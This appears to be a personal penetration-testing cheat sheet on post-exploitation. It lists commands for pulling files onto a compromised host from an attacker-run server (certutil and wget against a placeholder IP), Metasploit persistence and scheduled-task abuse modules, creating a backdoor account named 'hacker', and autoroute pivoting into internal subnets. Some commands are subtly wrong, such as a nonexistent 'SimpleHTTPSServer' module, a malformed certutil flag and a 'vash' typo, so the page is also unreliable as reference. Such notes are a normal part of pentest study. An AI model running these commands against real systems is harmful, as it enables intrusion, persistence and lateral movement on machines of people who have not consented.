---
layout: default
title: Post Exploitation
nav_order: 2
has_children: false
parent: Pentesting
grand_parent: DylanGrl Writings
---

## Post Exploitation

### File Transfers 

Hosting a file using python and a web server: 

```bash
python -m SimpleHTTPSServer 80
```

Hosting a file using python and a ftp server: 

```bash
python -m pyftpdlib 21
```


Downloading on Windows using Certutil

```powershell
certutil.exe --urlcache -f http://<ip>/<file> file.ext
```

On Linux:
```bash
wget <ip>
```


Downloading from ftp: 
```vash
ftp <IP>
```


Using metasploit with meterpreter shell facilitate the download / upload of file. 

### Mantaining access

#### Persistence script

Very dangerous as it leave a port open on the machine. 

```sh
run persistence --h
exploit/windows/local/persistence
exploit/windows/local/registry_persistence
```

#### Scheduled Task

```sh
run scheduleme
run schtaskabuse
```

#### Adding a user
```powershell
net user hacker password123 /add
```

### Pivoting

#### Using Metasploit

From an existing metasploit shell session. 

We first check the existing route on the machine: 
```bash
route print
```

Or the ARP with:
```bash
arp -a
```

Then from meterpreter session (after quiting the shell on the machine):
```bash
run autoroute -s <ip>/<subnet>
run autoroute -p #To verify the new route
```

Now we scan do scanning and other action against the subnet.


